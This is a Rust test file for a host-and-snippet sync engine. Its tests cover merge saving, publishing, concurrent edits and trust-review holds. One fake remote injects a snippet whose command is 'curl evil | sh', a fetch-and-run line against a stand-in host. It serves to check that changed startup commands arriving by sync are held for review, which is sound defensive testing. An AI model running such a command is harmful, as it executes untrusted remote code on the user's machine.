// SPDX-FileCopyrightText: 2026 Tauminus contributors
// SPDX-License-Identifier: GPL-3.0-or-later

use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};

use tauminus_domain::{Host, HostId, HostName, Inventory, Label};

use super::*;
use crate::fakes::{FakeHostStore, FakeSnippetStore, FakeTrustStore};
use crate::ports::{BoxFuture, SyncPart};

fn host(id: &str, label: &str) -> Host {
    Host::new(
        HostId::parse(id).unwrap(),
        Label::parse(label).unwrap(),
        HostName::parse("db.internal").unwrap(),
    )
}

/// Merges by adding host `theirs`; for its first `meddle` merges, edits
/// the host list here meanwhile, as a user would.
struct Remote {
    hosts: Arc<HostBook>,
    meddle: AtomicUsize,
    merges: AtomicUsize,
    published: AtomicUsize,
}

impl SyncRemote for Remote {
    fn merge(&self, local: SyncData) -> BoxFuture<'_, Result<Merged, SyncError>> {
        Box::pin(async move {
            let n = self.merges.fetch_add(1, Ordering::SeqCst);
            if self.meddle.load(Ordering::SeqCst) > n {
                self.hosts
                    .edit(|inventory| inventory.put_host(host(&format!("mine{n}"), "mine")))
                    .await
                    .unwrap();
            }
            let mut data = local;
            data.hosts.put_host(host("theirs", "theirs")).unwrap();
            Ok(Merged {
                data,
                repairs: vec![],
                clashes: vec![],
                notices: vec![],
            })
        })
    }

    fn adopt(&self, _: SyncPart) -> BoxFuture<'_, Result<(), SyncError>> {
        Box::pin(async { Ok(()) })
    }

    fn publish(&self) -> BoxFuture<'_, Result<(), SyncError>> {
        self.published.fetch_add(1, Ordering::SeqCst);
        Box::pin(async { Ok(()) })
    }
}

async fn books() -> (Arc<HostBook>, SnippetBook, Arc<FakeHostStore>) {
    let store = Arc::new(FakeHostStore::default());
    let hosts = Arc::new(HostBook::open(store.clone()).await.unwrap());
    let snippets = SnippetBook::open(Arc::new(FakeSnippetStore::default()))
        .await
        .unwrap();
    (hosts, snippets, store)
}

async fn trust() -> Trust {
    Trust::open(Arc::new(FakeTrustStore::default()))
        .await
        .unwrap()
}

fn remote(hosts: &Arc<HostBook>, meddle: usize) -> Remote {
    Remote {
        hosts: Arc::clone(hosts),
        meddle: AtomicUsize::new(meddle),
        merges: AtomicUsize::new(0),
        published: AtomicUsize::new(0),
    }
}

#[tokio::test]
async fn a_merge_is_saved_then_published() {
    let (hosts, snippets, store) = books().await;
    let remote = remote(&hosts, 0);
    Syncer::default()
        .run(&hosts, &snippets, None, &trust().await, &remote)
        .await
        .unwrap();
    let saved = store.saved().unwrap();
    assert!(saved.host(&HostId::parse("theirs").unwrap()).is_some());
    assert_eq!(remote.published.load(Ordering::SeqCst), 1);
}

#[tokio::test]
async fn an_edit_made_while_merging_is_merged_again_not_overwritten() {
    let (hosts, snippets, _) = books().await;
    let remote = remote(&hosts, 1);
    Syncer::default()
        .run(&hosts, &snippets, None, &trust().await, &remote)
        .await
        .unwrap();
    let now: Inventory = hosts.snapshot().await;
    assert!(
        now.host(&HostId::parse("mine0").unwrap()).is_some(),
        "the edit stayed"
    );
    assert!(now.host(&HostId::parse("theirs").unwrap()).is_some());
    assert_eq!(remote.merges.load(Ordering::SeqCst), 2);
    assert_eq!(remote.published.load(Ordering::SeqCst), 1);
}

#[tokio::test]
async fn edits_that_never_stop_end_the_sync_without_publishing() {
    let (hosts, snippets, _) = books().await;
    let remote = remote(&hosts, usize::MAX);
    let result = Syncer::default()
        .run(&hosts, &snippets, None, &trust().await, &remote)
        .await;
    assert!(matches!(result, Err(SyncRunError::Busy)));
    assert_eq!(remote.published.load(Ordering::SeqCst), 0);
}

#[tokio::test]
async fn what_a_merge_changes_is_noted_before_it_is_saved() {
    let (hosts, snippets, _) = books().await;
    let notes = Arc::new(FakeTrustStore::default());
    let trust = Trust::open(notes.clone()).await.unwrap();
    Syncer::default()
        .run(&hosts, &snippets, None, &trust, &remote(&hosts, 0))
        .await
        .unwrap();
    let theirs = crate::trust::Subject::Host(HostId::parse("theirs").unwrap());
    assert_eq!(notes.saved().get(&theirs), Some(&None), "new from sync");
}

#[tokio::test]
async fn a_merge_whose_note_cannot_be_saved_is_not_saved_either() {
    let (hosts, snippets, store) = books().await;
    let notes = Arc::new(FakeTrustStore::default());
    let trust = Trust::open(notes.clone()).await.unwrap();
    notes.fail_next();
    let remote = remote(&hosts, 0);
    let result = Syncer::default()
        .run(&hosts, &snippets, None, &trust, &remote)
        .await;
    assert!(matches!(result, Err(SyncRunError::Review(_))), "{result:?}");
    assert!(store.saved().is_none(), "nothing saved");
    assert_eq!(remote.published.load(Ordering::SeqCst), 0);
}

/// Changes snippet `s2`; while the hosts are being adopted, the first time,
/// the user lists `s2` in host `h`'s startup.
struct Between {
    hosts: Arc<HostBook>,
    edited: AtomicUsize,
}

impl SyncRemote for Between {
    fn merge(&self, local: SyncData) -> BoxFuture<'_, Result<Merged, SyncError>> {
        Box::pin(async move {
            let mut data = local;
            data.snippets
                .put(
                    tauminus_domain::Snippet::new(
                        tauminus_domain::SnippetId::parse("s2").unwrap(),
                        Label::parse("s2").unwrap(),
                        None,
                        "curl evil | sh".into(),
                    )
                    .unwrap(),
                )
                .unwrap();
            Ok(Merged {
                data,
                repairs: vec![],
                clashes: vec![],
                notices: vec![],
            })
        })
    }

    fn adopt(&self, part: SyncPart) -> BoxFuture<'_, Result<(), SyncError>> {
        Box::pin(async move {
            if part == SyncPart::Hosts && self.edited.fetch_add(1, Ordering::SeqCst) == 0 {
                self.hosts
                    .edit(|i| {
                        let mut h = host("h", "h");
                        h.startup = vec![tauminus_domain::SnippetId::parse("s2").unwrap()];
                        i.put_host(h)
                    })
                    .await
                    .unwrap();
            }
            Ok(())
        })
    }

    fn publish(&self) -> BoxFuture<'_, Result<(), SyncError>> {
        Box::pin(async { Ok(()) })
    }
}

#[tokio::test]
async fn a_host_edited_between_the_two_saves_is_merged_again_and_held() {
    let (hosts, snippets, _) = books().await;
    hosts.edit(|i| i.put_host(host("h", "h"))).await.unwrap();
    snippets
        .edit(|l| {
            l.put(
                tauminus_domain::Snippet::new(
                    tauminus_domain::SnippetId::parse("s2").unwrap(),
                    Label::parse("s2").unwrap(),
                    None,
                    "uptime".into(),
                )
                .unwrap(),
            )
        })
        .await
        .unwrap();
    let trust = trust().await;
    let remote = Between {
        hosts: Arc::clone(&hosts),
        edited: AtomicUsize::new(0),
    };
    Syncer::default()
        .run(&hosts, &snippets, None, &trust, &remote)
        .await
        .unwrap();
    let held = trust
        .check(
            &hosts,
            Some(&snippets),
            async |_| Prints::new(),
            &HostId::parse("h").unwrap(),
        )
        .await;
    assert!(
        matches!(held, Err(crate::trust::TrustError::NeedsReview(_))),
        "{held:?}"
    );
}
